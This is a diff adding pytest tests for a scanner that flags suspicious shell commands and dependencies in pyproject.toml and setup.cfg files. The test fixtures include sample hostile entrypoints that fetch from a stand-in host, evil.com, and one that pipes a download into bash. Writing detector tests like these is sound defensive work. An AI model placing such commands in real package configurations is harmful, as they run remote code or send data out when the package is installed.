@@ -204,3 +204,122 @@ def test_analyzer_name(analyzer):
     toml = '[build-system]\nrequires = ["requests"]\nbuild-backend = "setuptools.build_meta"\n'
     findings = analyzer.analyze(toml, "pyproject.toml")
     assert all(f.analyzer_name == "config_files" for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# #19 fix: case-insensitive shell keyword detection
+# ---------------------------------------------------------------------------
+
+def test_pyproject_uppercase_shell_keyword_detected(analyzer):
+    """CURL uppercase must be detected — case-insensitive check."""
+    toml = (
+        '[project.scripts]\n'
+        'evil = "CURL http://evil.com/steal"\n'
+    )
+    findings = analyzer.analyze(toml, "pyproject.toml")
+    assert any(f.severity == Severity.CRITICAL for f in findings), (
+        "CURL (uppercase) should be detected as a shell keyword"
+    )
+
+
+def test_pyproject_uppercase_wget_detected(analyzer):
+    """WGET uppercase must be detected."""
+    toml = (
+        '[project.scripts]\n'
+        'bad = "WGET http://evil.com/payload -O /tmp/x"\n'
+    )
+    findings = analyzer.analyze(toml, "pyproject.toml")
+    assert any(f.severity == Severity.CRITICAL for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# #19 fix: Python entrypoint false-positive eliminated
+# ---------------------------------------------------------------------------
+
+def test_pyproject_bash_utils_ep_not_flagged(analyzer):
+    """mypackage.bash_utils:main is a valid Python entrypoint — must NOT be flagged.
+
+    The substring 'bash' and 'sh' in 'bash_utils' previously caused false positives.
+    """
+    toml = (
+        '[project]\n'
+        'name = "my-pkg"\n'
+        'version = "1.0.0"\n'
+        '\n'
+        '[project.scripts]\n'
+        'mypackage-bash-utils = "mypackage.bash_utils:main"\n'
+    )
+    findings = analyzer.analyze(toml, "pyproject.toml")
+    assert len(findings) == 0, (
+        f"'mypackage.bash_utils:main' is a valid Python entrypoint, got: {[f.description for f in findings]}"
+    )
+
+
+def test_pyproject_shutils_ep_not_flagged(analyzer):
+    """mypackage.shutils:run — 'sh' substring in module name must not trigger."""
+    toml = (
+        '[project.scripts]\n'
+        'my-tool = "mypackage.shutils:run"\n'
+    )
+    findings = analyzer.analyze(toml, "pyproject.toml")
+    assert len(findings) == 0
+
+
+def test_setup_cfg_clean_ep_with_underscore_not_flagged(analyzer):
+    """setup.cfg entrypoint with underscores in module name must not be flagged."""
+    cfg = (
+        "[options.entry_points]\n"
+        "console_scripts =\n"
+        "    my-tool = my_pkg.bash_helpers:main\n"
+    )
+    findings = analyzer.analyze(cfg, "setup.cfg")
+    assert len(findings) == 0, (
+        f"'my_pkg.bash_helpers:main' is valid Python, got: {[f.description for f in findings]}"
+    )
+
+
+def test_setup_cfg_uppercase_shell_detected(analyzer):
+    """CURL uppercase in setup.cfg entrypoint must be detected."""
+    cfg = (
+        "[options.entry_points]\n"
+        "console_scripts =\n"
+        "    evil = CURL http://evil.com | bash\n"
+    )
+    findings = analyzer.analyze(cfg, "setup.cfg")
+    assert any(f.severity == Severity.CRITICAL for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# #18 fix: approximate line numbers (no longer always 0)
+# ---------------------------------------------------------------------------
+
+def test_pyproject_suspicious_dep_has_nonzero_line(analyzer):
+    """Line number for a suspicious build dep should point to the actual line."""
+    toml = (
+        '[build-system]\n'
+        'requires = ["setuptools", "requests"]\n'
+        'build-backend = "setuptools.build_meta"\n'
+    )
+    findings = analyzer.analyze(toml, "pyproject.toml")
+    assert findings, "Expected at least one finding"
+    # Line 2 contains 'requests'
+    assert any(f.line_number == 2 for f in findings), (
+        f"Expected line 2, got line numbers: {[f.line_number for f in findings]}"
+    )
+
+
+def test_setup_cfg_dep_has_nonzero_line(analyzer):
+    """Line number for a suspicious setup.cfg dep should be non-zero."""
+    cfg = (
+        "[metadata]\n"
+        "name = evil-pkg\n"
+        "\n"
+        "[options]\n"
+        "install_requires =\n"
+        "    boto3\n"
+    )
+    findings = analyzer.analyze(cfg, "setup.cfg")
+    assert findings
+    assert all(f.line_number > 0 for f in findings), (
+        f"Expected non-zero line numbers, got: {[f.line_number for f in findings]}"
+    )
